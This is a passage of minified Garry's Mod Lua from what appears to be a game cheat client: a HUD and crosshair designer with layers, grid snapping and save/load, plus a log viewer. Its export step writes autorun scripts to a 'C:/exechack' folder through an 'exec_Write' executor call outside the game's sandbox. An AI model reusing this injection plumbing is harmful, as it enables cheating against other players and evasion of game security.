self=HD.GridEditor;draw.RoundedBox(0,0,0,a8,a9,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a8,a9)end;local bC=vgui.Create("DCheckBoxLabel",HD.GridEditor)bC:SetPos(5,40)bC:SetText("Enabled")bC:SetValue(HD.GridEnabled)bC:SizeToContents()bC.OnChange=function(self,aR)HD.GridEnabled=aR end;local bD=vgui.Create("DNumberWang",HD.GridEditor)bD:SetDecimals(0)bD:SetMinMax(2,50)bD:SetValue(HD.GridSize)bD:SetPos(5,5)bD:SetSize(70,25)bD.Think=function()if bD:GetValue()>=2 and bD:GetValue()<=50 then HD.GridSize=bD:GetValue()end end;bD.Up.DoClick=function(a1,bE)bD:SetValue(math.Clamp(bD:GetValue()+2,2,50))end;bD.Down.DoClick=function(a1,bE)bD:SetValue(math.Clamp(bD:GetValue()-2,2,50))end;HD.GridOpen=true elseif bo==HD.Tools.Layers then if HD.LayerOpen then HD.SetTool(nil)HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil;return end;local bp,bq=HD.IconLayout,HD.ToolbarButtons.Layers;local br,bs=bq:GetPos()local bt,bu=bp:GetPos()br,bs=br+bt,bs+bu;local bF=1;if HD.Layers>2 then bF=2 end;HD.LayerSel=vgui.Create("DScrollPanel",HD.Frame)HD.LayerSel:SetSize(180,95*bF)HD.LayerSel:SetPos(br-HD.LayerSel:GetWide()/4,40)HD.LayerSel.Paint=function()local self=HD.LayerSel;draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(39,174,96))end;HD.LayerSel.Paint=function(a7,a8,a9)local self=HD.LayerSel;draw.RoundedBox(0,0,0,a8,a9,Color(35,35,35))surface.SetDrawColor(Color(100,100,100))surface.DrawOutlinedRect(0,0,a8,a9)end;local bw=vgui.Create("DLabel",HD.LayerSel)bw:SetPos(35,5)bw:SetColor(Color(255,255,255))bw:SetFont("HD_Smaller")bw:SetText("Current Layer: "..HD.CurLayer)bw:SizeToContents()bw.Think=function()bw:SetText("Current Layer: "..HD.CurLayer)end;local d=1;local bG=30;local bH=15;local bh={}for d=1,HD.Layers do bh[d]=0;local bI=vgui.Create("DButton",HD.LayerSel)bI:SetPos(10,bG)bI:SetSize(HD.LayerSel:GetWide()-20-bH,50)bI:SetTextColor(Color(255,255,255))bI:SetFont("HD_Smaller")bI.Paint=function()local aZ=Color(90,90,90,200)if bh[d]==0 then aZ.a=100 end;if HD.CurLayer==d then aZ.a=255 else aZ.a=200 end;draw.RoundedBox(0,0,0,bI:GetWide(),bI:GetTall(),aZ)end;bI.Think=function()if bh[d]==nil then bh[d]=0 end;bh[d]=HD.ShapesOnLayer[d]bI:SetText("Layer: "..d.." Shapes: "..tostring(bh[d]))end;bI.DoClick=function()HD.CurLayer=d;HD.LayerView=true end;bG=bG+bI:GetTall()+20 end;local bJ=vgui.Create("DButton",HD.LayerSel)bJ:SetPos(10,bG)bJ:SetSize(HD.LayerSel:GetWide()-20-bH,50)bJ:SetTextColor(Color(255,255,255))bJ:SetText("Add Layer")bJ:SetFont("HD_Smaller")bJ.Paint=function()local aZ=Color(90,90,90,255)draw.RoundedBox(0,0,0,bJ:GetWide(),bJ:GetTall(),aZ)end;bJ.DoClick=function()HD.Layers=HD.Layers+1;HD.CurLayer=HD.Layers;local d=1;for d=1,HD.Layers do for aO,m in pairs(HD.Tools)do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}HD.DrawnObjects[d][m]=HD.DrawnObjects[d][m]or{}end end;HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil;HD.ToolFunctions(HD.Tools.Layers)end;HD.LayerOpen=true elseif bo==HD.Tools.Close then HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;HD.DesignerOpen=false;HD.Frame=nil;HD.CloseOpenInfoPanels()HD.Sizing,HD.Moving=false;HD.CurMovingData={}elseif bo==HD.Tools.Save then Derma_StringRequest("Custom Crosshair","Create lua file","",function(T)local bK='local lp=LocalPlayer();local wep=LocalPlayer():GetActiveWeapon();hook.Add("HUDPaint","'..T..'",function()\n'for layer,aX in pairs(HD.CreateExportCode())do for aO,m in pairs(aX)do bK=bK..m.."\n"end end;exec_Write("C:/exechack".."/"..T.."_autorun.lua",bK.."end)")HD.Frame:Close()if HD.SplashFrame then HD.SplashFrame:Close()end;HD.DesignerOpen=false;HD.Frame=nil;HD.CloseOpenInfoPanels()HD.Sizing,HD.Moving=false;HD.CurMovingData={}end)end end;function HD.OpenShapeSettings(aX,b6,b7)if HD.ShapeOptions[aX]then HD.ShapeOptions[aX]:SetVisible(false)HD.ShapeOptions[aX]=nil end;HD.CancelAlter()HD.ShapeOptions=HD.ShapeOptions or{}local bL=HD.GetShapeData(aX)local ba=HD.GetShapeType(aX)local layer=HD.GetShapeLayer(aX)HD.ShapeOptions[aX]=vgui.Create("DFrame",HD.Frame)HD.ShapeOptions[aX]:SetSize(150,120)local ay,aA=math.Clamp(b6,0,ScrW()-HD.ShapeOptions[aX]:GetWide()),math.Clamp(b7,0,ScrH()-HD.ShapeOptions[aX]:GetTall())HD.ShapeOptions[aX]:SetPos(ay,aA)HD.ShapeOptions[aX]:SetTitle("")HD.ShapeOptions[aX]:SetDraggable(true)HD.ShapeOptions[aX].btnMaxim:SetVisible(false)HD.ShapeOptions[aX].btnMinim:SetVisible(false)HD.ShapeOptions[aX].btnClose:SetVisible(false)HD.ShapeOptions[aX].Paint=function()local self=HD.ShapeOptions[aX]draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(39,174,96))end;HD.ShapeOptions[aX].OnMousePressed=function()local self=HD.ShapeOptions[aX]HD.CurMovingData,HD.Moving,HD.CurSizeID,HD.Sizing={},false,nil,false;self.Dragging={gui.MouseX()-self.x,gui.MouseY()-self.y}self:MouseCapture(true)return end;local bM=vgui.Create("DButton",HD.ShapeOptions[aX])bM:SetText("X")bM:SetTextColor(Color(255,255,255,255))bM:SetPos(HD.ShapeOptions[aX]:GetWide()-45,5)bM:SetFont("HD_Button")bM:SetSize(40,20)bM.Paint=function()draw.RoundedBox(0,0,0,bM:GetWide(),bM:GetTall(),Color(200,79,79,255))end;bM.DoClick=function()HD.CurMovingData,HD.Moving,HD.CurSizeID,HD.Sizing={},false,nil,false;HD.ShapeOptions[aX]:Close()HD.ShapeOptions[aX]=nil end;local bN=vgui.Create("DNumberWang",HD.ShapeOptions[aX])bN:SetDecimals(0)bN:SetMinMax(1,500)bN:SetValue(HD.CurLayer)bN:SetPos(20,30)bN:SetSize(60,25)bN:SetTooltip("Change your shape's layer")bN.OnValueChanged=function()local bO=bN:GetValue()if bO==nil or bO==0 then return end;if HD.Layers<bO then HD.Layers=bO end;HD.EditShape(aX,{layer=HD.CurLayer,newlayer=bO},"layer")layer=HD.GetShapeLayer(aX)end;if ba=="draw.RoundedBox"then local bP=vgui.Create("DNumberWang",HD.ShapeOptions[aX])bP:SetDecimals(0)bP:SetMinMax(0,40)bP:SetValue(bL.corner)bP:SetPos(20,80)bP:SetSize(60,25)bP:SetTooltip("Change your shape's corner size")bP.OnValueChanged=function()local bO=bP:GetValue()if bO==nil then return end;if bO~=bL.corner then HD.EditShape(aX,{corner=bO},"corner")end end;bP.Up.DoClick=function(a1,bE)bP:SetValue(bP:GetValue()+2)end;bP.Down.DoClick=function(a1,bE)bP:SetValue(bP:GetValue()-2)end elseif ba=="draw.DrawText"then local bQ=vgui.Create("DTextEntry",HD.ShapeOptions[aX])bQ:SetSize(80,25)bQ:SetPos(20,80)bQ:SetText(bL.text)bQ:SetFont("HD_Button")bQ:SetTooltip("Enter your text here")bQ.OnChange=function(self,aR)HD.DrawnObjects[layer][ba][aX].text=self:GetText()local font=HD.DrawnObjects[layer][ba][aX].font;local width,height=HD.GetTextSize(self:GetText(),font)HD.DrawnObjects[layer][ba][aX].width,HD.DrawnObjects[layer][ba][aX].height=width,height;local bR=HD.Boundaries[aX]HD.Boundaries[aX].farx,HD.Boundaries[aX].fary=bR.x+width,bR.y+height end;local bS=vgui.Create("DTextEntry",HD.ShapeOptions[aX])bS:SetSize(80,25)bS:SetPos(20,130)bS:SetText(bL.font)bS:SetFont("HD_Button")bS:SetTooltip("Enter a valid font for your text")bS.OnEnter=function(self,aR)HD.DrawnObjects[layer][ba][aX].font=self:GetText()end;local bT=nil;HD.ShapeOptions[aX].Format=vgui.Create("DComboBox",HD.ShapeOptions[aX])HD.ShapeOptions[aX].Format:SetSize(80,25)HD.ShapeOptions[aX].Format:SetPos(20,180)for aO,m in pairs(HD.FormatTypes)do if m.code==HD.DrawnObjects[layer][ba][aX].format then bT=aO;break end end;HD.ShapeOptions[aX].Format:SetValue(bT or"Type")HD.ShapeOptions[aX].Format:SetFont("HD_Button")HD.ShapeOptions[aX].Format:SetTooltip("string.format Types")a={}for bU in pairs(HD.FormatTypes)do table.insert(a,bU)end;table.sort(a)for d,bU in ipairs(a)do HD.ShapeOptions[aX].Format:AddChoice(bU)end;HD.ShapeOptions[aX].Format.OnSelect=function(self,bV,A)local bW=HD.FormatTypes[A]if A=="None"then HD.ShapeOptions[aX].Format:SetValue("Type")HD.DrawnObjects[layer][ba][aX].format=nil;HD.DrawnObjects[layer][ba][aX].text="Sample Text"return end;HD.DrawnObjects[layer][ba][aX].text=bW.text;HD.DrawnObjects[layer][ba][aX].format=bW.code end elseif ba=="surface.DrawTexturedRect"then local bX=tostring(bL.texturestring or bL.texture)if bX=="___error"or bX==nil then bX="Image Path"end;local bY=vgui.Create("DTextEntry",HD.ShapeOptions[aX])bY:SetSize(80,25)bY:SetPos(20,80)bY:SetText(bX)bY:SetFont("HD_Button")bY:SetTooltip("Relative to the materials/ directory")bY.OnEnter=function(self,aR)local bZ=Material(self:GetText())HD.DrawnObjects[layer][ba][aX].texture=bZ;HD.DrawnObjects[layer][ba][aX].texturestring=self:GetText()end end;local b_=vgui.Create("DLabel",HD.ShapeOptions[aX])b_:SetPos(5,10)b_:SetColor(Color(255,255,255))b_:SetFont("HD_Smaller")b_:SetText("Shape Layer:")b_:SizeToContents()local c0=vgui.Create("DLabel",HD.ShapeOptions[aX])c0:SetPos(5,60)c0:SetColor(Color(255,255,255))c0:SetFont("HD_Smaller")if ba=="draw.RoundedBox"then c0:SetText("Corner Size:")elseif ba=="draw.DrawText"then c0:SetText("Text:")elseif ba=="surface.DrawTexturedRect"then c0:SetText("Texture:")end;c0:SizeToContents()local c1=vgui.Create("DLabel",HD.ShapeOptions[aX])c1:SetPos(100,60)c1:SetColor(Color(255,255,255))c1:SetFont("HD_Smaller")c1:SetText("ID: "..aX)c1:SizeToContents()if ba=="draw.DrawText"then local c2=vgui.Create("DLabel",HD.ShapeOptions[aX])c2:SetPos(5,110)c2:SetColor(Color(255,255,255))c2:SetFont("HD_Smaller")c2:SetText("Font: ")c2:SizeToContents()local c3=vgui.Create("DLabel",HD.ShapeOptions[aX])c3:SetPos(5,160)c3:SetColor(Color(255,255,255))c3:SetFont("HD_Smaller")c3:SetText("Format: ")c3:SizeToContents()local ac,ad=HD.ShapeOptions[aX]:GetSize()HD.ShapeOptions[aX]:SetSize(ac,ad+100)end end;function HD.AddShape(aX,ay,aA,width,height,color,c4,layer)color=color or HD.DefaultCol;layer=layer or HD.CurLayer;HD.DrawnObjects[layer]=HD.DrawnObjects[HD.CurLayer]or{}HD.DrawnObjects[layer][HD.CurType]=HD.DrawnObjects[HD.CurLayer][HD.CurType]or{}ay,aA=math.SnapTo(ay,HD.GridSize),math.SnapTo(aA,HD.GridSize)width,height=math.SnapTo(width,HD.GridSize),math.SnapTo(height,HD.GridSize)if HD.CurType=="draw.RoundedBox"then HD.DrawnObjects[layer][HD.CurType][aX]={x=ay,y=aA,width=width,height=height,color=color,corner=c4.corner}elseif HD.CurType=="surface.DrawTexturedRect"then HD.DrawnObjects[layer][HD.CurType][aX]={x=ay,y=aA,width=width,height=height,color=color,texture=c4.texture}else end;HD.SetBoundaries(aX,ay,aA,width,height,layer)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end;function HD.AddText(aX,ay,aA,text,font,color,layer)layer=layer or HD.CurLayer;color=color or Color(0,0,0)HD.DrawnObjects[layer]=HD.DrawnObjects[layer]or{}HD.DrawnObjects[layer]["draw.DrawText"]=HD.DrawnObjects[layer]["draw.DrawText"]or{}if color==HD.DefaultCol then color=Color(0,0,0)end;ay,aA=math.SnapTo(ay,HD.GridSize),math.SnapTo(aA,HD.GridSize)HD.DrawnObjects[layer]["draw.DrawText"][aX]={x=ay,y=aA,text=text,font=font,color=color}local width,height=HD.GetTextSize(text,font)HD.SetBoundaries(aX,ay,aA,width,height,layer)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end;function HD.EditShape(aX,c5,c6)if aX==nil then return end;c6=string.lower(c6)local c7=HD.GetShapeLayer(aX)or HD.CurLayer;local ba=HD.GetShapeType(aX)or HD.CurType;HD.DrawnObjects[c7]=HD.DrawnObjects[c7]or{}HD.DrawnObjects[c7][ba]=HD.DrawnObjects[c7][ba]or{}local c8=HD.DrawnObjects[c7][ba][aX]if c8==nil then return end;local ay,aA;width,height,text,font,color,layer,newlayer,corner,format,texture,texturestring=nil;local c9,ca=nil;ay,aA=c5.x or c8.x,c5.y or c8.y;layer,newlayer=c5.layer or c7,c5.newlayer or c7;color=c5.color or c8.color;if ba=="draw.DrawText"then text,font=c5.text or c8.text,c5.font or c8.font;width,height=HD.GetTextSize(text,font)format=c5.format or c8.format else width,height=c5.width or c8.width,c5.height or c8.height end;if ba=="draw.RoundedBox"then corner=c5.corner or c8.corner elseif ba=="surface.DrawTexturedRect"then texture=c5.texture or c8.texture,c5.texturestring or c8.texturestring end;if c6=="size"then if ba=="draw.DrawText"then return end;width,height=math.SnapTo(width,HD.GridSize),math.SnapTo(height,HD.GridSize)width,height=math.Clamp(width,HD.GridSize,ScrW()),math.Clamp(height,HD.GridSize,ScrH())HD.DrawnObjects[layer][ba][aX].width=width;HD.DrawnObjects[layer][ba][aX].height=height;HD.SetBoundaries(aX,ay,aA,width,height,layer)elseif c6=="move"then local cb,cc=HD.Canvas:GetSize()ay,aA=math.Clamp(ay,0,cb-width),math.Clamp(aA,0,cc-height)HD.DrawnObjects[layer][ba][aX].x=ay;HD.DrawnObjects[layer][ba][aX].y=aA;HD.SetBoundaries(aX,ay,aA,width,height,layer)elseif c6=="layer"then local cd=layer;local bJ=newlayer;HD.DrawnObjects[bJ]=HD.DrawnObjects[bJ]or{}HD.DrawnObjects[bJ][ba]=HD.DrawnObjects[bJ][ba]or{}local d=1;for d=1,HD.Layers do for ba,aW in pairs(HD.DrawnObjects[d])do if aW[aX]then aW[aX]=nil end end end;HD.DrawnObjects[cd][ba][aX]=nil;if ba=="draw.RoundedBox"then HD.DrawnObjects[bJ][ba][aX]={x=ay,y=aA,width=width,height=height,color=color,corner=corner}elseif ba=="draw.DrawText"then HD.DrawnObjects[bJ][ba][aX]={x=ay,y=aA,text=text,font=font,color=color,format=format}elseif ba=="surface.DrawTexturedRect"then HD.DrawnObjects[bJ][ba][aX]={x=ay,y=aA,width=width,height=height,color=color,texture=texture,texturestring=texturestring}else print("Attempt to layer unknown object")return end;HD.SetBoundaries(aX,ay,aA,width,height,bJ)return elseif c6=="corner"then if ba=="draw.DrawText"then return end;HD.DrawnObjects[c7][ba][aX].corner=corner;HD.SetBoundaries(aX,ay,aA,width,height,layer)end end;function HD.CloseOpenInfoPanels()if HD.GridOpen then HD.GridEditor:SetVisible(false)HD.GridOpen=false;HD.GridEditor=nil end;if HD.ColMixerOpen then HD.ColMixer:SetVisible(false)HD.ColMixerOpen=false;HD.ColMixer=nil end;if HD.LayerOpen then HD.LayerSel:SetVisible(false)HD.LayerOpen=false;HD.LayerView=false;HD.LayerSel=nil end;if HD.ExportOpen then HD.Exporter:SetVisible(false)HD.ExportOpen=false;HD.Exporter=nil end;if HD.LoadOpen then HD.LoadSel:SetVisible(false)HD.LoadOpen=false;HD.LoadSel=nil end;if HD.CreateOpen then HD.CreatePanel:SetVisible(false)HD.CreateOpen=false;HD.CreatePanel=nil end;HD.SetTool()end;function HD.GetMousePos()local ce=1;local cf=38;local b6=HD.Canvas:ScreenToLocal(gui.MouseX())-ce;local b7=HD.Canvas:ScreenToLocal(gui.MouseY())-cf;return b6,b7 end;function HD.GetTool()return HD.CurTool,HD.SelectedButton end;function HD.GetTextSize(text,font)surface.SetFont(font)local width,height=surface.GetTextSize(text)return width,height end;function HD.GetShapeData(aX)if aX==nil then return end;local ba=HD.GetShapeType(aX)local layer=HD.GetShapeLayer(aX)local cg={}for aO,m in pairs(HD.DrawnObjects[layer][ba][aX])do cg[aO]=m end;return cg end;function HD.GetShapeLayer(aX)if aX==nil then return end;local d=1;for d=1,HD.Layers do local ba=HD.GetShapeType(aX)or HD.CurType;if HD.DrawnObjects[d][ba]~=nil then if HD.DrawnObjects[d][ba][aX]then return d end end end end;function HD.GetShapeType(aX)local d=1;for d=1,HD.Layers do for aO,m in pairs(HD.Types)do if HD.DrawnObjects[d][m]~=nil then if HD.DrawnObjects[d][m][aX]then return m end end end end end;function HD.SetTool(bo,M)HD.CurTool=bo;HD.SelectedButton=M end;function HD.SetType(M)for aO,m in pairs(HD.Types)do if string.lower(m)==string.lower(M)then HD.CurType=HD.Types[aO]return true end end end;function HD.SetBoundaries(aX,ay,aA,width,height,layer)layer=layer or HD.CurLayer;HD.Boundaries[aX]={x=ay,y=aA,farx=ay+width,fary=aA+height,layer=layer}end;function HD.InfoPanelOpen()if HD.GridOpen or HD.ColMixerOpen or HD.LayerOpen or HD.ExportOpen or HD.CreateOpen or HD.LoadOpen then return true end;return false end;function HD.CancelAlter()HD.CurMovingData={}HD.Moving=false;HD.CurSizeID=nil;HD.Sizing=false end;function HD.IsInCanvas(ay,aA)ay,aA=tonumber(ay),tonumber(aA)local cb,cc=HD.Canvas:GetSize()local ch,ci=0,HD.GridSize;if HD.InfoPanelOpen()then return false end;if ay>ch and ay<cb then if aA>ci and aA<cc then return true end end;return false end;function HD.IsInSize(aX,ay,aA)ay,aA=tonumber(ay),tonumber(aA)if HD.GetShapeType(aX)=="draw.DrawText"then return end;local a_=20;local D=HD.Boundaries[aX]if D then local b0,b1=D.farx,D.fary;local b2,b3=b0-a_,b1-a_;if HD.InfoPanelOpen()then return false end;if ay>b2 and ay<b0 then if aA>b3 and aA<b1 then return true end end end;return false end;function HD.IsInShape(ay,aA)ay,aA=tonumber(ay),tonumber(aA)local be,bf,aX;for cj,c5 in pairs(HD.Boundaries)do if ay>c5.x and ay<c5.farx then if aA>c5.y and aA<c5.fary then if c5.layer==HD.CurLayer then be,bf=ay-c5.x,aA-c5.y;aX=cj;return true,aX,be,bf end end end end;return false end;function math.SnapTo(bo,ck)if HD.GridEnabled~=true then return bo end;bo=math.Round(bo)local cl={min=0,max=0}for d=1,ck do if math.IsDivisible(bo+d,ck)then cl.max=bo+d end;if math.IsDivisible(bo-d,ck)then cl.min=bo-d end end;if cl.max-bo<=bo-cl.min then return cl.max else return cl.min end end;function math.IsDivisible(cm,cn)return cm%cn==0 end;function HD.Load(co)HD.CancelAlter()local cp=file.Read("g/"..co,"DATA")local c5=util.JSONToTable(cp)HD.ProjectName=c5.ProjectName or HD.ProjectName;HD.ProjectText:SetText(HD.ProjectName)local d=1;local Z=table.Count(c5)if Z>1 then Z=Z-1 end;for d=1,Z do HD.DrawnObjects[d]=HD.DrawnObjects[d]or{}for ba,aW in pairs(c5[d])do HD.DrawnObjects[d][ba]=HD.DrawnObjects[d][ba]or{}for aX,aY in pairs(aW)do HD.DrawnObjects[d][ba][HD.ShapeID]={}table.Merge(HD.DrawnObjects[d][ba][HD.ShapeID],aY)local aZ=HD.DrawnObjects[d][ba][HD.ShapeID].color or HD.DefaultCol;HD.DrawnObjects[d][ba][HD.ShapeID].color=Color(aZ.r,aZ.g,aZ.b,aZ.a)if ba=="surface.DrawTexturedRect"then local cq=HD.FAKE_TEXTURE;local cr=HD.DrawnObjects[d][ba][HD.ShapeID].texturestring or cq;local bo=surface.GetTextureID(cr)HD.DrawnObjects[d][ba][HD.ShapeID].texture=bo;HD.DrawnObjects[d][ba][HD.ShapeID].texturestring=cr end;local width,height=nil;if ba=="draw.DrawText"then width,height=HD.GetTextSize(aY.text,aY.font)else width,height=aY.width,aY.height end;HD.SetBoundaries(HD.ShapeID,aY.x,aY.y,width,height,d)HD.ShapeID=HD.ShapeID+1;HD.ShapeCount=HD.ShapeCount+1 end end end;print("Loaded HUD from "..co)end;function HD.Save(M)if HD.ShapeCount<2 then print("Not enough shapes ("..HD.ShapeCount..") to save!")return end;print("Saving current project..")local cs=table.Copy(HD.DrawnObjects)local d=1;for d=1,HD.Layers do for ba,aW in pairs(cs[d])do for aX,aY in pairs(aW)do local aZ=aY.color or HD.DefaultCol;aY.color={r=aZ.r,g=aZ.g,b=aZ.b,a=aZ.a}end end end;cs.ProjectName=cs.ProjectName or HD.ProjectName;local cp=util.TableToJSON(cs)if cp~="[]"then local ct,cu,cv=nil;ct={"/","\\","?","|","<",">",'"',":"}cu=M or HD.ProjectName;for aO,m in pairs(ct)do cu=string.gsub(cu,m,"-")end;cu=string.gsub(cu," ","")cv=os.date("%H%M%S")cv=string.gsub(cv,":","")cv=string.lower("save_"..cu.."_"..cv)file.CreateDir("g")file.Write("g/"..cv..".txt",cp)end;timer.Simple(0.5,function()HD.SetTool(HD.Tools.Select,"Select")end)end;function HD.Autosave()print("Autosaving current project..")local cp=util.TableToJSON(HD.DrawnObjects)if cp~="[]"then local ct={"/","\\","?","|","<",">",'"',":"}local cu=HD.ProjectName;for aO,m in pairs(ct)do cu=string.gsub(cu,m,"-")end;cu=string.gsub(cu," ","")local cv=os.date("%H%M%S")cv=string.gsub(cv,":","")cv=string.lower("autosave_"..cu.."_"..cv)file.CreateDir("g/autosaves/")file.Write("g/autosaves/"..cv..".txt",cp)end end;function HD.CreateExportCode()HD.CancelAlter()local cw={}local d=1;for d=1,HD.Layers do cw[d]={}for ba,aW in pairs(HD.DrawnObjects[d])do if ba=="draw.RoundedBox"then local E=1;for E=1,HD.ShapeCount do local c5=HD.DrawnObjects[d][ba][E]if c5~=nil then local ay,aA,width,height,aZ,corner=c5.x,c5.y,c5.width,c5.height,c5.color,c5.corner;local cx,cy,cz,cA=nil;if HD.ScaleSize then cz,cA=math.Round(ScrW()/width,2),math.Round(ScrH()/height,2)if cz==math.huge then width=0 else width="ScrW()/"..cz..""end;if cA==math.huge then height=0 else height="ScrH()/"..cA..""end end;aA=aA+HD.Y_BUFFER;if HD.ScalePos then cx,cy=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cx==math.huge then ay=0 else ay="ScrW()/"..cx end;if cy==math.huge then aA=0 elseif cy==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cy end else if ay>ScrW()/2 then cx=ScrW()-ay;ay="ScrW()-"..cx end;if aA>ScrH()/2 then cy=ScrH()-aA;aA="ScrH()-"..cy end end;aZ="Color("..aZ.r..", "..aZ.g..", "..aZ.b..", "..aZ.a..")"cw[d][E]=string.format("draw.RoundedBox(%i, %s, %s, %s, %s, "..aZ..")",corner,ay,aA,width,height)end end elseif ba=="draw.DrawText"then local E=1;for E=1,HD.ShapeCount do local c5=HD.DrawnObjects[d][ba][E]if c5~=nil then local ay,aA,width,height,aZ,corner=c5.x,c5.y,c5.width,c5.height,c5.color,c5.corner;local ay,aA,text,font,aZ,format=c5.x,c5.y,c5.text,c5.font,c5.color,c5.format;aA=aA+HD.Y_BUFFER;local cx,cy=nil;if HD.ScalePos then cx,cy=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cx==math.huge then ay=0 else ay="ScrW()/"..cx end;if cy==math.huge then aA=0 elseif cy==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cy end end;if format~=nil then local c5,cB=nil;for aO,m in pairs(HD.FormatTypes)do if m.code==format then c5=aO end end;c5=HD.FormatTypes[c5]cB=c5.code;text=cB else text='"'..text..'"'end;aZ="Color("..aZ.r..", "..aZ.g..", "..aZ.b..", "..aZ.a..")"cw[d][E]=string.format('draw.DrawText(%s, "%s", %s, %s, '..aZ..')',text,font,ay,aA,aZ)end end elseif ba=="surface.DrawTexturedRect"then local E=1;for E=1,HD.ShapeCount do local c5=HD.DrawnObjects[d][ba][E]if c5~=nil then local ay,aA,width,height,aZ,texture,texturestring=c5.x,c5.y,c5.width,c5.height,c5.color,c5.texture,c5.texturestring;texturestring=texturestring or"INVALID_TEXTURE"local cx,cy,cz,cA=nil;if HD.ScaleSize then cz,cA=math.Round(ScrW()/width,2),math.Round(ScrH()/height,2)if cz==math.huge then width=0 else width="ScrW()/"..cz..""end;if cA==math.huge then height=0 else height="ScrH()/"..cA..""end end;aA=aA+HD.Y_BUFFER;if HD.ScalePos then cx,cy=math.Round(ScrW()/ay,2),math.Round(ScrH()/aA,2)if cx==math.huge then ay=0 else ay="ScrW()/"..cx end;if cy==math.huge then aA=0 elseif cy==1.24 then aA="ScrH()-("..height..")"else aA="ScrH()/"..cy end else if ay>ScrW()/2 then cx=ScrW()-ay;ay="ScrW()-"..cx end;if aA>ScrH()/2 then cy=ScrH()-aA;aA="ScrH()-"..cy end end;aZ="Color("..aZ.r..", "..aZ.g..", "..aZ.b..", "..aZ.a..")"local draw=string.format("surface.DrawTexturedRect(%s, %s, %s, %s, "..aZ..")",ay,aA,width,height)cw[d][E]=[[
local Texture]]..E..[[ = Material("]]..texturestring..[[") 
surface.SetMaterial(Texture]]..E..[[)
surface.SetDrawColor(]]..aZ..[[)
]]..draw end end else end end end;return cw or{}end;function HD.FontCreator()local cC=vgui.Create("DFrame")cC:SetSize(ScrW(),ScrH())cC:SetPos(0,0)cC:SetTitle("")cC:SetDraggable(false)cC.btnMaxim:SetVisible(false)cC.btnMinim:SetVisible(false)cC.btnClose:SetVisible(false)cC.Paint=function()draw.RoundedBox(0,0,0,cC:GetWide(),cC:GetTall(),Color(0,0,0,0))end;local cD=vgui.Create("DFrame",cC)cD:SetSize(500,400)cD:SetPos(ScrW()/2-cD:GetWide()/2,ScrH()/2-cD:GetTall()/2)cD:SetTitle("")cD:MakePopup()cD:SetDraggable(true)cD.btnMaxim:SetVisible(false)cD.btnMinim:SetVisible(false)cD.btnClose:SetVisible(true)cD.Paint=function()draw.RoundedBox(0,0,0,cD:GetWide(),cD:GetTall(),Color(39,174,96))end;local bM=vgui.Create("DButton",cD)bM:SetText("Exit")bM:SetTextColor(Color(255,255,255,255))bM:SetFont("HD_Title")bM:SetSize(80,30)bM:SetPos(cD:GetWide()-bM:GetWide()-10,10)bM.Paint=function()draw.RoundedBox(0,0,0,bM:GetWide(),bM:GetTall(),Color(200,79,79,255))end;bM.DoClick=function()cC:Close()cD:Close()end end;HD.OpenDesigner()end;local cE=vgui.Create("DFrame")cE:SetSize(670,400)cE:Center()cE:SetTitle("")cE:MakePopup()cE:SetSizable(true)cE:ShowCloseButton(false)cE.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.windowbg)draw.RoundedBox(0,0,0,ac,22,b.titlebar)draw.SimpleText("Logs","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,ac,ad)end;cE.PerformLayout=function(self,E,F)b.lst:SetSize(E-6,25)if IsValid(b.ll)then b.ll:SetSize(E-6,F-83)end end;b.lst=vgui.Create("DTextEntry",cE)b.lst:SetPos(3,53)b.lst:SetSize(594,25)b.lst:SetText("")b.lst.Paint=function(self,ac,ad)surface.SetDrawColor(b.textentry)surface.DrawRect(0,0,ac,ad)self:DrawTextEntryText(Color(255,255,255),Color(30,130,255),Color(255,255,255))end;b.lst.OnTextChanged=function()if IsValid(b.ll)and b.logtype then b.findlog(b.lst:GetValue(),b.logtype)end end;local cF=3;local function cG(cH,M,z)a1(M,cF,25,cH,25,cE,z)cF=cF+cH+2 end;function b.findlog(cI,type)if not IsInGame()then return end;if IsValid(b.ll)then b.ll:Remove()end;b.ll=vgui.Create("DScrollPanel",cE)b.ll:SetPos(3,80)b.ll:SetSize(600-6,267)b.ll.Paint=function(h,ac,ad)end;b.ll.VBar.Paint=function(cJ,ac,ad)draw.RoundedBox(0,0,0,ac,ad,Color(0,0,0,50))end;b.ll.VBar.btnUp.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▲","HudHintTextSmall",3,2,Color(255,255,255))end;b.ll.VBar.btnDown.Paint=function(cJ,ac,ad)draw.RoundedBox(0,2,2,ac-4,ad-4,Color(0,0,0,25))draw.DrawText("▼","HudHintTextSmall",3,2,Color(255,255,255))end;local function cK(cL)local cM=vgui.Create("DButton",b.ll)cM:Dock(TOP)cM:DockMargin(4,0,0,0)cM:SetText("")cM:SetColor(b.colortext)cM.DoClick=function()SetClipboardText(cL)end;cM.Paint=function(h,ac,ad)draw.RoundedBox(0,0,0,ac,ad,b.button)if cM.Hovered then draw.RoundedBox(0,0,0,ac,ad,b.buttonhovered)end;draw.SimpleText(cL,"hack_font_20",1,1,b.colortext)end end;local cN=util.JSONToTable(file.Read(b.logs,"DATA"))for h,ad in pairs(string.Explode("HLS",cN[type][1]))do if ad==""then return end;if string.find(ad,cI:Replace("[",""):Replace("]",""))then cK(ad)end end 